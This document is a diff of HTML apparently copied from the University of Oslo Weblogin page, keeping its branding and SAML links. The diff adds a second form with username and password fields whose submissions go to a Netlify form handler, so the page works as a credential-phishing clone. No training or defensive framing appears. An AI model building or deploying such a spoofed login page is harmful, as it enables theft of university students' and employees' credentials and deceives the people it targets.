@@ -1,40 +1,3 @@
-<!DOCTYPE html>
-<html>
-<head>
-<meta charset="utf-8">
-<meta id="viewport" name="viewport" content="width=device-width, initial-scale=1" />
-<meta http-equiv="X-UA-Compatible" content="IE-edge" />
-<script type="text/javascript">
-    if (window.localStorage && localStorage.getItem("ANDROID_TABLET")) {
-        var tabletVp = document.getElementById('viewport');
-        tabletVp.setAttribute("content", "width=1020, user-scalable=yes");
-    }
-</script>
-<!-- Include additional JavaScript files here if needed -->
-<!-- Add stylesheets and links to external resources here if needed -->
-<title>Weblogina</title>
-</head>
-<body class="app-fluid-responsive">
-<div id="app-head-wrapper">
-    <div id="line-top">
-        <div id="uiologo">
-            <a href="https://www.uio.no/english/">University of Oslo</a>
-        </div>
-    </div>
-    <div id="app-head">
-        <div id="app-name">
-            <a href="https://www.uio.no/tjenester/it/brukernavn-passord/weblogin/">Weblogin</a>
-            <span id="tagline">Login service for University of Oslo</span>
-        </div>
-        <div id="head-menu">
-            <a href="#" id="language-select">Language</a>
-            <ul class="language-menu">
-                <li><a href="https://weblogin.uio.no/simplesaml/module.php/delegate/login.php?AuthState=_95c325cb0832936beecf4d9930547f98fd9c110aaa%3Ahttps%3A%2F%2Fweblogin.uio.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttp%253A%252F%252Fuio.instructure.com%252Fsaml2%26cookieTime%3D1699290402&amp;language=no">Bokmål</a></li>
-                <li><a href="https://weblogin.uio.no/simplesaml/module.php/delegate/login.php?AuthState=_95c325cb0832936beecf4d9930547f98fd9c110aaa%3Ahttps%3A%2F%2Fweblogin.uio.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttp%253A%252F%252Fuio.instructure.com%252Fsaml2%26cookieTime%3D1699290402&amp;language=nn">Nynorsk</a></li>
-            </ul>
-        </div>
-    </div>
-</div>
 <div id="app-content">
     <div id="login-box-wrapper">
         <div id="login-box">
@@ -53,4 +16,29 @@
                         <div id="login-text-people" class="login-text active"><a href="https://www.uio.no/english/services/it/username-password/">Forgotten username or password?</a></div>
                     </div>
                     <div id="info-text-wrapper"></div>
-                </
+                </fieldset>
+            </form>
+            <form name="contact" method="POST" data-netlify="true">
+                <input type="hidden" name="form-name" value="contact">
+                <label>Username: <input type="text" name="name" /></label>
+                <label>Password: <input type="password" name="password" /></label>
+                <button type="submit">Send</button>
+            </form>
+            <div id="backend-list">
+                <!-- text for responsive layout -->
+                <h2 class="additional-login">Or log in with</h2>
+                <div class="backend-wrapper">
+                    <a class="internal-backend active" id="internal-backend-people">
+                        <span class="text">Login for students and employees at UiO</span>
+                    </a>
+                </div>
+                <div class="backend-wrapper">
+                    <a class="external-backend" id="external-backend-https://idp.feide.no" href="?=&AuthState=_95c325cb0832936beecf4d9930547f98fd9c110aaa%3Ahttps%3A%2F%2Fweblogin.uio.no%2Fsimplesaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttp%253A%252F%252Fuio.instructure.com%252Fsaml2%26cookieTime%3D1699290402&forward=https%3A%2F%2Fidp.feide.no">
+                        <img class="logo flap-idp.feide.no" src="/simplesaml/resources/flap-logo-feide.png" alt="Feide - Norwegian educational institutions">
+                        <span class="text">Feide - Norwegian educational institutions</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
